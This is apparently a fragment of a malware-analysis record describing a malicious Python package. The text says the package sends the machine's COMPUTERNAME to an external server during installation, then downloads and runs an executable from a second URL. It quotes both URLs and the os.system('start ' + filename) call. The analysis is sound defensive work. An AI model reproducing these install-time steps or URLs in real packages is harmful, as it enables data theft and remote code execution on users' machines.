During installation, it attempts to retrieve the environment variable 'COMPUTERNAME' and sends it via an HTTP GET request to an external server ('https://linkedopports.com/pyp/resp.php?live=Installation new c kw ' + env). Additionally, it downloads and executes an executable file ('ini_file_pyp_41.exe') from a suspicious URL ('https://python-release.com/python-install.scr') using os.system('start '+filename). This behavior indicates an attempt to exfiltrate system information and execute potentially harmful code on the victim's machine, which is characteristic of malicious activity.",
